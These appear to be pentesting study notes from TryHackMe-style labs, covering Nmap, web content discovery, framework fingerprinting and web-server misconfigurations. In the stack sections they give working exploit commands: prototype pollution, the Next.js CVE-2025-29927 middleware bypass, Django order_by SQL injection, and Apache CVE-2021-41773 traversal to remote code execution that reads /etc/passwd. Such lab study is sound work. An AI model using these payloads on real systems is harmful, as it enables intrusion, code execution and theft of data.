3. Trigger the idle machine again and compare the new IP ID to the earlier one.

**Getting More Details:**
- `--reason` — Nmap explains its reasoning/conclusions (why it decided a system is up or a port is open)
- `-v` — verbose output; `-vv` — even more verbose
- `-d` — debugging details; `-dd` — even more (guaranteed to produce output beyond a single screen)

### Nmap Post Port Scans

**Service Detection** — once open ports are found, probe them to detect the running service. This is essential — a pentester can use it to learn if known vulnerabilities exist for that service. `-sV` collects/determines service and version info. Control intensity with `--version-intensity LEVEL` (0 = lightest, 9 = most complete). `-sV --version-light` ≈ intensity 2; `-sV --version-all` ≈ intensity 9.

**OS Detection** — Nmap can detect the OS based on behaviour and telltale signs in responses. Enable with `-O` (uppercase O, as in OS). Convenient, but accuracy is affected by many factors — Nmap needs at least one open and one closed port on the target to make a reliable guess, and virtualization can distort OS fingerprints. Always take the OS guess with a grain of salt.

**Traceroute** — add `--traceroute` to have Nmap find the routers between you and the target.

**Nmap Scripting Engine (NSE)** — a script is code that doesn't need to be compiled; it stays human-readable. NSE is a Lua interpreter built into Nmap, letting it execute Nmap scripts written in Lua — you don't need to learn Lua to use them. Run default-category scripts with `--script=default` or `-sC`. Categories:
| Category | Purpose |
|---|---|
| `auth` | Authentication related scripts |
| `broadcast` | Discover hosts by sending broadcast messages |
| `brute` | Brute-force password auditing against logins |
| `default` | Default scripts, same as `-sC` |
| `discovery` | Retrieve accessible information, e.g. DB tables, DNS names |
| `dos` | Detect servers vulnerable to Denial of Service |
| `exploit` | Attempt to exploit various vulnerable services |
| `external` | Checks using a third-party service (Geoplugin, Virustotal) |
| `fuzzer` | Launch fuzzing attacks |
| `intrusive` | Intrusive scripts (brute-force, exploitation) |
| `malware` | Scan for backdoors |
| `safe` | Safe scripts that won't crash the target |
| `version` | Retrieve service versions |
| `vuln` | Check for vulnerabilities / exploit vulnerable services |

Example: `sudo nmap -sS -sC MACHINE_IP` — SYN scan then run default scripts. You can target scripts by name or pattern: `--script "SCRIPT-NAME"` or `--script "ftp*"` (includes `ftp-brute`, etc.). If unsure what a script does, open it in a text reader like `less`.

**Saving the Output** — it's only reasonable to save results to a file, and a good filename convention matters — the number of files grows fast. Three main formats:
1. Normal
2. Grepable
3. XML

Plus a fourth that's not really recommended:
- Script Kiddie

| Format | Flag | Notes |
|---|---|---|
| **Normal** | `-oN FILENAME` | Similar to what you see on screen when scanning |
| **Grepable** | `-oG FILENAME` | Named after `grep` (Global Regular Expression Printer); makes filtering scan output for specific keywords efficient. E.g. grepping the grepable output for a port returns `80/tcp open http nginx 1.6.2` on one line, unlike normal output, which won't even show the host IP inline — very convenient when sifting through results across multiple systems |
| **XML** | `-oX FILENAME` | Most convenient for processing output in other programs |
| **All three** | `-oA FILENAME` | Combines `-oN`, `-oG`, and `-oX` |
| **Script Kiddie** | `-oS FILENAME` | Useless for searching output for keywords or keeping for reference — mostly just for looking "1337" in front of non-tech-savvy friends |

> [!summary] Quick Recap — Nmap
> - Six port states: open, closed, filtered, unfiltered, open\|filtered, closed\|filtered
> - `-sS` = default/stealthy SYN scan (root only); `-sT` = full-handshake fallback for non-root; `-sU` = UDP
> - Stealth scans (`-sN`/`-sF`/`-sX`) infer state from **absence** of RST; `-sA`/`-sW` map firewalls, not port state
> - Always pair a full scan with `-p-` — don't trust the default top-1000 blindly
> - `-sC -sV -O --reason -oA outputname` is a solid "give me everything" one-liner
> - Save output in **grepable + XML**, not just normal — future-you will thank present-you
> - Spoofing/decoy/idle scans only work if you can actually observe the responses

---

## 6. Web Application Security Fundamentals

### Walking An Application

**Exploring The Website** — finding interactive portions can be as easy as spotting a login form, or as involved as manually reviewing the site's JavaScript. A good place to start: just explore with your browser, noting individual pages/areas/features and a summary of each.

**Viewing The Page Source** — the human-readable code returned to your browser/client each time you make a request. Made up of HTML, CSS, and JavaScript — together telling the browser what content to display, how to show it, and adding interactivity. Code starting with `<!--` and ending with `-->` are comments — messages developers leave for other programmers, or notes/reminders for themselves. Comments don't display on the actual page. Links in HTML are written in anchor tags (`<a>`), with the destination stored in the `href` attribute.

**Developer Tools — Inspector** — every modern browser includes developer tools, a toolkit for debugging web applications, giving you a peek under the hood of a website. The page source doesn't always represent what's shown on the page, because CSS/JS/user interaction can change content and style — the Inspector lets you view what's currently displayed in the browser window. You can also edit and interact with page elements live, helpful for debugging.

**Developer Tools — Debugger** — intended for debugging JavaScript; useful for pentesters to dig deep into the JS code. Called "Debugger" in Firefox/Safari, "Sources" in Chrome.

**Developer Tools — Network** — tracks every external request a page makes. Click the Network tab, refresh, and you'll see every file the page requests.

### Content Discovery

**What Is Content Discovery?** — in web application security, "content" can be many things: a file, video, picture, backup, or a website feature. Content discovery isn't about the obvious stuff visible on a site — it's about things not immediately presented, that weren't always intended for public access. Could be staff-only pages/portals, older site versions, backup files, config files, admin panels, etc. Three main ways to discover content: **Manual**, **Automated**, and **OSINT**.

**Manual Discovery — Robots.txt** — tells search engines which pages they are/aren't allowed to show in results, or bans specific crawlers from the site altogether. Common practice to restrict areas like admin portals or customer-only files from appearing in search results.
`url: http://TheIP/robots.txt`

**Manual Discovery — Favicon** — the small icon shown in the browser's address bar/tab, used for branding. When frameworks are used to build a site, a leftover favicon from the installation can give a clue about the framework in use, if the developer never replaced it. OWASP hosts a database of common framework icons to check against: https://wiki.owasp.org/index.php/OWASP_favicon_database

Practical: on a test site showing "Website coming soon...", the tab shows an icon confirming a favicon is in use. Viewing page source shows a link to `images/favicon.ico`. Download it and get its MD5 hash to look up:
```
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
```

**Manual Discovery — Sitemap.xml** — unlike robots.txt (which restricts what crawlers can see), sitemap.xml lists every file the site owner *wants* listed on a search engine. These can sometimes contain areas that are harder to navigate to, or list old pages the site no longer links to but that still work behind the scenes.

**Manual Discovery — HTTP Headers** — server responses include headers that can contain useful info, such as webserver software and possibly the programming/scripting language in use (e.g. NGINX 1.18.0 running PHP 7.4.3) — useful for finding vulnerable versions.
```
curl http://10.113.188.25 -v
```
(`-v` = verbose mode, outputs headers)

**Manual Discovery — Framework Stack** — once you've identified the framework (via favicon or clues in page source — comments, copyright notices, credits), locate the framework's website to learn more about it and possibly find more content to discover.

**OSINT — Google Hacking / Dorking** — external resources ("OSINT" — Open-Source Intelligence) can help discover info about a target site, freely available. Google Dorking uses Google's advanced search features to pick out custom content:
- `site:` — e.g. `site:tryhackme.com` returns results only from that domain
- `inurl:` — e.g. `inurl:admin` returns results with that word in the URL
- `filetype:` — e.g. `filetype:pdf` returns results of that file extension
- `intitle:` — e.g. `intitle:admin` returns results with that word in the title

**OSINT — Wappalyzer** (https://www.wappalyzer.com/) — an online tool and browser extension that identifies what technologies a website uses (frameworks, CMS, payment processors, and more), often including version numbers.

**OSINT — Wayback Machine** (https://archive.org/web/) — a historical archive of websites dating back to the late 90s. Search a domain, see every time the service scraped and saved the page's contents. Can uncover old pages that may still be active on the current site.

**OSINT — GitHub** — to understand GitHub, first understand Git: a version control system tracking file changes in a project. Teams can see what each member is editing/changing; when done, users commit with a message and push to a central repository for others to pull. GitHub is a hosted version of Git online — repos can be public or private with various access controls. Search for company/website names to find repos belonging to your target; you may find source code, passwords, or other content not yet discovered.

**OSINT — S3 Buckets** — a storage service from Amazon AWS, letting people save files/static website content in the cloud, accessible over HTTP/HTTPS. Owners set access permissions (public/private/writable), sometimes incorrectly, inadvertently exposing files. Format: `http(s)://{name}.s3.amazonaws.com`, where `{name}` is chosen by the owner (e.g. `tryhackme-assets.s3.amazonaws.com`). Discoverable via URLs in page source, GitHub repos, or automation — a common method is combining the company name with common terms: `{name}-assets`, `{name}-www`, `{name}-public`, `{name}-private`, etc.

**Automated Discovery** — using tools to discover content instead of doing it manually, since this usually means hundreds/thousands/millions of requests checking whether a file or directory exists. Made possible by **wordlists** — text files with long lists of commonly used words, covering many use cases (password wordlists = frequent passwords; content discovery wordlists = commonly used directory/file names). A great resource, preinstalled on the THM AttackBox: https://github.com/danielmiessler/SecLists (curated by Daniel Miessler).

**Automation Tools:**
```
# ffuf
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.113.188.25/FUZZ

# dirb
dirb http://10.113.188.25/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

# Gobuster
gobuster dir --url http://10.113.188.25/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

### Modern Web Stack

Stack fingerprinting is one of the fastest ways to reduce the attack surface during a pentest. Every web stack leaks information through:
- HTTP Headers
- Cookie Names
- Error Messages
- URL Structure
- HTML Source Code

Once the framework and version are identified, known vulnerabilities (CVEs) can be mapped directly to the target.

**General Workflow:**
1. Fingerprint the stack from passive HTTP signals.
2. Confirm version and identify applicable CVEs.
3. Execute the exploit chain and understand the root cause.

#### MERN Stack (MongoDB, Express.js, React, Node.js)

MERN is one of the most common JavaScript web stacks. Typical deployment: Node.js backend, Express.js web framework, React frontend, MongoDB database.

**Common Ports:** Express : 3000, MongoDB : 27017

Many applications expose JSON APIs that perform object merging and user updates. Improper merge logic can lead to Prototype Pollution vulnerabilities.

**Fingerprinting Express.js:**
Header check:
```
curl -I http://MACHINE_IP:3000/
```

Primary signals:
| Signal | Value | Confidence |
|---|---|---|
| X-Powered-By | Express | High |
| Set-Cookie | connect.sid | High |
| Error Route | Cannot GET /path | High |

Important headers:
```
X-Powered-By: Express
Set-Cookie: connect.sid=...
```
Express session cookie is generated by `express-session` and is named `connect.sid`. Absence of `connect.sid` does **not** confirm Express is absent, because `saveUninitialized: false` prevents session creation until needed.

**Express Unhandled Route Fingerprint:**
Request: `curl http://MACHINE_IP:3000/nonexistent`
Response: `Cannot GET /nonexistent`
This plain-text style error is a strong Express fingerprint.

Comparison of framework error styles:
| Framework | Typical Error |
|---|---|
| Express | Cannot GET /path |
| Django | HTML Error Page |
| Next.js | Styled HTML Error |
| Apache | Apache 403/404 Page |

**Prototype Pollution — Concept:**
Every JavaScript object inherits from `Object.prototype`. If user input allows modification of `__proto__` or `constructor.prototype`, then properties can be injected into every object inside the application.

Example payload: `{ "__proto__": { "isAdmin": true }}`
Result: `Object.prototype.isAdmin = true` — every object now appears to have `isAdmin = true` through prototype inheritance.

**Vulnerable Endpoint Enumeration:**
| Endpoint | Method | Purpose |
|---|---|---|
| /api/user/update | POST | Updates session user |
| /api/admin/flag | GET | Admin-only flag |

Save session: `curl -c cookies.txt http://MACHINE_IP:3000/`
Access protected route: `curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag`
Expected (before exploitation): `{"error":"Not authorized"}`

**Prototype Pollution Exploitation:**
Pollute prototype:
```
curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```
Expected: `{"status":"updated"}`

Request flag:
```
curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
```
Flag: `THM{pr0t0_p0llut3d}`

#### Next.js

Next.js is currently the dominant React framework.

**Common Features:** App Router, React Server Components (RSC), Middleware Authentication

**Common Deployment:**
```
npm run build
npm start
```

**Important:** CVE-2025-29927 and CVE-2025-55182 only affect **production** builds. `next dev` is **not** vulnerable.

**Fingerprinting Next.js:**
Header check: `curl -I http://MACHINE_IP:3001/`

Common signals:
| Signal | Value | Confidence |
|---|---|---|
| X-Powered-By | Next.js | High |
| window.__next_f | Present | High |
| /_next/static/chunks/ | Present | High |
| x-nextjs-cache | Present | High |

Important headers:
```
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-prerender: 1
```

Most reliable signal: `window.__next_f` — indicates App Router + React Server Components.

**CVE-2025-29927 — Middleware Authentication Bypass:**

Next.js middleware is commonly used for Authentication, Session Validation, and Access Control.

Normal request: `curl http://MACHINE_IP:3001/dashboard`
Redirect: `/login` — authentication is enforced.

**Root Cause:** Next.js uses the `x-middleware-subrequest` header to avoid middleware recursion. The framework trusted this header even when supplied by external clients. If present, middleware execution is skipped — authentication logic never runs.

**Exploitation:**
```
curl \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://MACHINE_IP:3001/dashboard
```
Result: `Dashboard` — Flag: `THM{m1ddl3w4r3_byp4ss3d}`

**Important Note:** if the project structure uses `src/middleware.ts`, use `src/middleware` five times in the header value instead.

**React Server Components (RSC)** — execute on the server; responses are streamed using the "Flight Protocol." This protocol became the attack surface for **CVE-2025-55182**, which allows unauthenticated RCE under specific Next.js and React versions.

> [!summary] Quick Recap — Web App Fundamentals
> - Content discovery = Manual (robots.txt, sitemap.xml, favicon hash, headers) + OSINT (dorking, Wappalyzer, Wayback, GitHub, S3) + Automated (ffuf/gobuster/dirb + SecLists)
> - `Cannot GET /path` = Express fingerprint; `window.__next_f` = Next.js fingerprint
> - Prototype pollution: watch for `__proto__` accepted unfiltered in a JSON body — can inject properties app-wide
> - CVE-2025-29927: blind trust in the `x-middleware-subrequest` header = middleware/auth bypass
> - CVE-2025-29927/CVE-2025-55182 only bite production builds, not `next dev`

---
#### Django

The MERN and Next.js stacks run on Node.js. Django is the Python-native alternative — the framework government agencies, newsrooms, and SaaS companies with Python teams reach for first. Its ORM is supposed to shield developers from SQL injection, and for most queries it does — but when developers bypass the ORM and concatenate user input directly into SQL, or the ORM itself has a flaw in a deprecated code path, the database is wide open.

**CVE-2021-35042** — a SQL injection vulnerability in Django's `order_by()` query method. CVSS 9.8 Critical, no authentication required.

**Stack Identity:** Django powers a large share of Python-backed web apps. On Ubuntu, it runs under Gunicorn or Django's built-in dev server, typically on port 8000. The admin panel at `/admin/` and CSRF middleware are enabled by default in virtually every Django project — the admin panel alone is a reliable stack signal before sending a single exploit payload.

**Fingerprinting Django:**

```
curl -I "http://MACHINE_IP:8000/products/"
```

```
HTTP/1.1 200 OK
Server: WSGIServer/0.2 CPython/3.10.12
Set-Cookie: csrftoken=...; SameSite=Lax
```

|Signal|Value|Confidence|
|---|---|---|
|Server header|`WSGIServer/0.2 CPython/X.X.X`|High|
|Cookie name|`csrftoken`|High|
|X-Frame-Options|`DENY`|High|
|X-Content-Type-Options|`nosniff`|High|
|Referrer-Policy|`same-origin`|Medium|
|HTML source (any POST form)|`csrfmiddlewaretoken` hidden field|High|

The `csrfmiddlewaretoken` hidden field is the most reliable Django fingerprint — Django's `CsrfViewMiddleware` injects it into every POST form automatically. Browse to `/admin/` and view source; it's always there. You won't find this in Express, Rails, or Next.js. The combination of `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin` appearing together signals Django's `SecurityMiddleware` — no other framework applies this combination by default.

**CVE-2021-35042 — the vulnerability:** The view handling `/products/` builds SQL by concatenating the `order` GET parameter directly into an `ORDER BY` clause:

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```

Whatever lands in `?order=` goes straight into the `THEN` branch with no validation. Since `CASE WHEN (1=1)` is always true, that branch always executes — making it the injection point.

**The `updatexml()` technique** exploits how MySQL handles XPath errors. `updatexml(1, xpath_expr, 1)` raises an error if the XPath expression is invalid; wrapping a `SELECT` inside the XPath argument with `concat(0x7e, ...)` makes MySQL include the query result in the error message. `0x7e` is hex for `~`, used as a delimiter to make the extracted value easy to spot. Django's debug mode (`DEBUG = True`) surfaces these MySQL errors in the HTTP 500 response body.

> [!warning] `updatexml()` only works when `DEBUG = True`. A production app with `DEBUG = False` returns a generic 500 with no detail — fall back to blind time-based injection with `SLEEP()`.

**Exploitation walkthrough:**

_Step 1 — extract MySQL version:_

```
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
```

→ `~8.0.45-0ubuntu0.22.04.1` (the 500 error page also reveals the Django version, e.g. `Django Version: 3.2.4`)

_Step 2 — extract database name:_

```
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
```

→ `~vuln_db` (feed this to sqlmap for a full dump)

---

#### LAMP (Linux, Apache, MySQL, PHP)

One of the earliest, most widely adopted web stacks — open-source, stable, easy to deploy. Linux = OS, Apache = web requests, MySQL = database, PHP = dynamic content. Still runs plenty of legacy systems and production environments today.

**Stack Identity:** On Ubuntu, Apache usually runs under `www-data`, serves files from `/var/www/html`, and passes dynamic requests to PHP through `mod_php` or PHP-FPM. Common attack surfaces: exposed PHP files, database errors, weak file permissions, misconfigured Apache/PHP settings.

**Fingerprinting:**

```
curl -I http://MACHINE_IP:8080/
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
```

`Server: Apache/2.4.49 (Unix)` maps directly to **CVE-2021-41773** and nothing else. Apache also repeats the version in 404 footers — confirm with a request to a non-existent path.

Checking `/cgi-bin/` matters too: a **403 Forbidden** means the directory exists and listing is disabled (`mod_cgi` configured — required for this exploit). A 404 would mean it's not present at all.

|Signal|Value|Confidence|
|---|---|---|
|Server header|`Apache/2.4.49 (Unix)`|High — exact CVE match|
|404 error footer|Apache/2.4.49 version string|High|
|`/cgi-bin/` response|`403 Forbidden` (not 404)|High — `mod_cgi` enabled|

**CVE-2021-41773 — the vulnerability:** Apache 2.4.49 changed `ap_normalize_path()`, which inadvertently broke the path traversal filter. Apache normally blocks `../` before it reaches the filesystem — the bug is in decode order: the traversal filter runs **before** full URL decoding.

Sending `.%2e/` (literal dot + URL-encoded dot + slash) means the filter never recognizes it as `../`. But when Apache passes the URL to the filesystem, the OS resolves `.%2e/` as `../` anyway — filter bypassed.

On its own, this is directory traversal for file read. It becomes critical combined with `mod_cgi`: if the traversal resolves to an executable like `/bin/sh`, Apache runs it as a CGI script and pipes the HTTP POST body to its stdin — unauthenticated RCE.

> [!warning] `curl` normalises `.%2e/` sequences before sending unless you pass `--path-as-is`. If your traversal requests return 403 instead of executing, this flag is almost always the missing piece.

**Exploitation walkthrough:**

_Step 1 — confirm RCE_ (the `echo Content-Type: text/plain; echo;` preamble is required by the CGI spec — Apache needs a valid header block + blank line before the body, or it 500s):

```
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
```

→ `uid=1(daemon) gid=1(daemon) groups=1(daemon)`

_Step 2 — read system accounts:_

```
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```

_Step 3 — read the flag:_

```
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
```

> [!info] Version-specific. CVE-2021-41773 affects **Apache 2.4.49 only**. The 2.4.50 patch blocked single-encoded dots but not double-encoding — that gap is **CVE-2021-42013**, bypassed with `%%32%65%%32%65/`. 2.4.51+ is fully patched. Either `Server: Apache/2.4.49` or `2.4.50` is an immediate signal to reach for this.

---

#### Automation — Nikto Across All Four Stacks

Manual fingerprinting teaches you what signals matter and why. Across a large scope, **Nikto** gives a fast first pass — probes each service, reads headers, surfaces stack signals and known misconfigs without writing a single payload.

```
nikto -h http://MACHINE_IP:PORT
```

|Port|Stack|Key Nikto findings|
|---|---|---|
|3000|MERN|No `Server` banner (Express doesn't send one). `x-powered-by: Express`, `connect.sid` cookie (missing `httponly` flag flagged as a bonus finding)|
|3001|Next.js|`x-powered-by: Next.js`; `x-nextjs-stale-time`, `x-nextjs-cache`, `x-nextjs-prerender` headers confirm production App Router — the condition CVE-2025-29927 requires|
|8000|Django|`Server: WSGIServer/0.2 CPython/3.10.12`; `referrer-policy: same-origin` + `x-content-type-options: nosniff` together confirm `SecurityMiddleware`|
|8080|Apache/LAMP|`Server: Apache/2.4.49 (Unix)` — direct CVE-2021-41773 indicator. Also flagged: ETag inode leak, missing X-Frame-Options, HTTP TRACE enabled (XST risk)|

Nikto identified the stack on every port in under a minute, and for Apache handed over the exact version — no further fingerprinting needed. For MERN and Django, the stack gets confirmed but Nikto has no templates for application-level injection flaws (prototype pollution, the Django `order_by()` SQLi) — that's where the manual fingerprinting/exploitation techniques take over.

> [!summary] Quick Recap — Django / LAMP / Automation
> 
> - Django tell: `csrfmiddlewaretoken` hidden field on every POST form — no other framework does this
> - Django SQLi via `order_by()`: unsanitized param in `ORDER BY` → `updatexml()` error-based extraction (needs `DEBUG=True`) → fallback to blind `SLEEP()`
> - Apache 2.4.49/2.4.50 header = check for CVE-2021-41773/CVE-2021-42013 path traversal → RCE via `mod_cgi`
> - `curl --path-as-is` is mandatory for traversal payloads — curl normalises `.%2e/` away otherwise
> - Nikto = fast multi-host triage tool, not a replacement for manual app-logic testing (SQLi/prototype pollution still need eyes on it)

### Web Server Attacks — I

> [!info] Room context Four web servers, one lab machine: **Apache2** (80), **Python HTTP Server** (8000), **Node.js Express** (3000), **Nginx** (8080). This room stops at _misconfiguration identification_ — no shells, no RCE, no privesc. The goal is reconnaissance: what's exposed, and why it matters. Everything here is a prerequisite skill for every exploitation technique that follows.

#### Identifying the Web Server

Before enumerating directories or testing inputs, identify what you're dealing with — the server software shapes which misconfigurations are possible and which tools are worth running.

**The `Server` response header** is the most direct fingerprinting signal:

```bash
# -s suppresses the progress bar
# -I sends a HEAD request, returning only response headers
curl -sI http://MACHINE_IP:80
```

Default `Server` header by port in this lab:

|Port|Server|Default `Server` Header|
|---|---|---|
|80|Apache2|`Apache/2.4.x (Ubuntu)`|
|8000|Python HTTP Server|`SimpleHTTP/0.6 Python/3.xx.x`|
|3000|Node.js Express|_None_ (set by application)|
|8080|Nginx|`nginx/1.xx.x`|

**Express sets no `Server` header** — neither Express nor the Node.js HTTP layer beneath it does this by default. The absence itself is a signal. Instead, Express's fingerprint is the **`X-Powered-By: Express`** header, set automatically unless a developer removes it. Check for it whenever `Server` is missing or generic.

**Browser DevTools** gives the same header info without extra tooling: open the target in Firefox, `F12` → **Network** tab → refresh → select the main request → **Headers** → **Response Headers**.

**Default error pages** fingerprint a server even when `Server` is suppressed — each server's 404 page looks different (Python: plain text; Nginx: version in HTML footer; Apache: name in page body). Use a `GET`, not `HEAD`, to see the body:

```bash
# HEAD request: headers only, no body
curl -sI http://MACHINE_IP:PORT/

# GET request: full response including body
curl -s http://MACHINE_IP:PORT/nonexistent-page-xyz
```

> [!summary] Quick Recap — Identifying the Server
> 
> - `curl -sI` → check `Server` header first
> - No `Server` header + `X-Powered-By: Express` → Node.js Express app
> - Default error/404 pages fingerprint software even when headers are suppressed
> - DevTools Network tab = same info, no CLI needed

---

#### Python HTTP Server (Port 8000)

Started with a single command — convenient for developers, dangerous when forgotten in production:

```bash
# Serves the current working directory over HTTP on port 8000
python3 -m http.server 8000
```

**What it serves:** the _entire_ working directory — every file, including dotfiles like `.env`. No access control, no authentication, no logging beyond the OS, no `.htaccess` equivalent. One mode: serve everything. This differs from Apache/Nginx, where directory listing is off by default and paths can be restricted.

**Directory listing** — if no `index.html` exists, Python auto-generates an HTML listing (page title: `Directory listing for /`):

```bash
curl -s http://MACHINE_IP:8000/
```

> [!note] Note If `index.html` exists, Python serves that file instead of a listing. If no listing appears at the root, try requesting subdirectories or paths directly.

**Dotfiles are not hidden** — Python's server ignores the Linux convention entirely:

```shell-session
root@attackbox:~# curl -s http://MACHINE_IP:8000/.env
SECRET_KEY=dev-secret-key-do-not-use
DATABASE_URL=postgresql://webapp:S3cur3DBPass!@localhost/production
DEBUG=True
```

**Archives left in the served directory** (`.zip`, `.tar.gz`, etc.) are worth downloading and inspecting — they may contain source, DB dumps, or configs:

```shell-session
root@attackbox:~# curl -s http://MACHINE_IP:8000/backup.zip -o backup.zip
root@attackbox:~# unzip backup.zip -d backup-contents/
root@attackbox:~# cat backup-contents/db_dump.sql
-- Database dump for staging environment
CREATE TABLE users (id INTEGER PRIMARY KEY, username VARCHAR(50));
INSERT INTO users VALUES (1, 'admin', 'admin@company.com');
INSERT INTO users VALUES (2, 'jsmith', 'jsmith@company.com');
-- End of dump
```

**Why it matters:** no vulnerability is triggered — the server works exactly as designed. The misconfiguration is _location_: it's running somewhere it shouldn't be, serving files that shouldn't be public. Document what it exposes and what an attacker could do with it.

> [!summary] Quick Recap — Python HTTP Server
> 
> - `python3 -m http.server PORT` serves the entire CWD, no exceptions
> - Dotfiles (`.env`) are served like any other file — unlike Apache/Nginx
> - No listing? Check for `index.html` overriding it, or browse subpaths directly
> - Always pull and inspect any archive files found in the listing

---

#### Apache2 (Port 80)

The world's most deployed web server. Its default Ubuntu config commonly leaves three things exposed: directory listing on specific paths, the `mod_status` page, and backup files in the document root.

**Version disclosure** — Ubuntu defaults to `ServerTokens OS`, including the OS label with the version:

```shell-session
root@ip-10-81-64-63:~# curl -SI http://MACHINE_IP:80 | grep -i server
Server: Apache/2.4.58 (Ubuntu)
```

**Directory listing** — Apache's `Options +Indexes` directive shows a file listing when no `index.html` exists in a directory. Sometimes intentional (internal file shares), sometimes an accident on a sensitive path.

```
http://MACHINE_IP/files/
```

→ page titled `Index of /files`, listing filenames, sizes, and modified dates. **Read every file found** — CSVs, internal notes, and backups often sit in directories meant only for casual internal use.

**`mod_status` page** — Apache's built-in real-time status page. Correctly configured, it's localhost-only; misconfigured with `Require all granted`, it's open to any IP:

```
http://MACHINE_IP:80/server-status
```

Shows active connections + requested paths, total requests since server start, worker states (idle/writing/reading/closing), and server version/start time.

> [!info] Why `/server-status` is worth checking even on "default" installs `mod_status` ships with `Require local` in `conf-available/security.conf`, but a `Require all granted` directive anywhere in a virtual host config **silently overrides** that restriction — without touching the module config itself. Always check `/server-status`, even on servers that look properly locked down.

**Finding unlinked files with Gobuster** — backups, old configs, and test files often have no links pointing to them:

```bash
# -u target URL, -w wordlist, -x append these extensions per word
gobuster dir -u http://TARGET_IP:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x bak,txt,html -t 20
```

> [!tip] Performance tip `common.txt` is large, and `-x` triples the request count (one per extension per word). Run without `-x` first to find directories, then a targeted `-x bak` sweep is faster than one giant combined scan.

Example findings: `.htpasswd`/`.htaccess` variants (403s — still worth noting, since `.htpasswd` holds crackable Basic Auth hashes), `backup.bak` (200), `/server-status` (200).

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:80/backup.bak
# Apache config backup - DO NOT COMMIT
ServerName company.internal
DocumentRoot /var/www/html
# DB credentials below
# user: dbadmin pass: Backup2024!
# Last updated: 2024-11-15
```

**The pattern, every time:** check the version header → browse any listable directory → hit `/server-status` → gobuster for unlinked files.

> [!summary] Quick Recap — Apache2
> 
> - `ServerTokens OS` (default on Ubuntu) leaks OS + version in `Server` header
> - `Options +Indexes` → directory listing; read everything found
> - `/server-status` (`mod_status`) can be exposed even if `security.conf` looks locked down — a vhost-level `Require all granted` overrides it silently
> - Gobuster with `-x bak,txt` catches backup/config files with no inbound links
> - `.htpasswd` found → crackable Basic Auth credential hash

---

#### Node.js (Express) (Port 3000)

Unlike Apache/Python, Express serves _application code_, not static files from a document root — the code decides every response. Attackers target Express apps because dev-mode features (debug endpoints, verbose errors, exposed env vars) routinely ship to production unchanged.

**Framework fingerprinting:**

```shell-session
root@ip-10-81-64-63:~# curl -sI http://MACHINE_IP:3000
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
...
```

**App version** — many Express apps return a JSON status at root:

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:3000
{"status":"ok","app":"company-portal","version":"1.2.0"}
```

**Triggering verbose errors** — Express's built-in handler suppresses stack traces when `NODE_ENV=production`, but a **custom error handler** (common in real apps) can leak stack traces regardless of `NODE_ENV`:

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:3000/api/users | python3 -m json.tool
{
    "error": "connect ECONNREFUSED 127.0.0.1:5432",
    "stack": "Error: connect ECONNREFUSED 127.0.0.1:5432\n    at /opt/nodeapp/app.js:16:15\n    ...",
    "query": "SELECT * FROM users"
}
```

A `500` from an API is always worth investigating — the stack trace reveals internal file paths, module names, and sometimes the exact failing query.

**Debug endpoints enumerating routes** — a leftover dev convenience that dumps every registered route:

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:3000/api/routes
[{"method":"GET","path":"/"},{"method":"GET","path":"/api/users"},{"method":"GET","path":"/api/routes"},{"method":"GET","path":"/api/debug/env"}]
```

If present, this saves a whole round of Gobuster enumeration.

> [!note] Express version sensitivity `/api/routes`-style endpoints typically work by reading `app._router.stack`, an **internal** property. Express 5 changed router internals enough to break implementations built for Express 4. An unexpected format/error from a route-listing endpoint may mean a different Express major version is in play.

**Exposed environment variables** — a debug endpoint returning `process.env` is a major finding:

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:3000/api/debug/env
{"NODE_ENV":"development","DB_PASSWORD":"NodeDBPass2024!","PORT":"3000","DB_HOST":"localhost:5432","APP_NAME":"company-portal"}
```

`NODE_ENV=development` on a production host is itself a red flag — a signal the app was deployed without hardening.

**Static file serving** — `express.static()` serves front-end assets; client-side JS often embeds API URLs, internal hostnames, or debug flags:

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:3000/static/config.js
// Client-side configuration
const API_BASE = 'http://internal-api.company.local:8080';
const DEBUG = true;
const VERSION = '1.2.0';
```

> [!warning] Dotfiles behave the opposite of Python's HTTP server `express.static()` silently 404s on dotfiles (anything starting with `.`) by default. A 404 on `.env` via a static route does **not** mean the file is absent — it means the middleware is blocking it. Shell access or a different route would be needed to reach it.

**The chain:** headers confirm the framework → errors leak internals → debug endpoints enumerate routes → static files reveal what devs assumed was safe to expose.

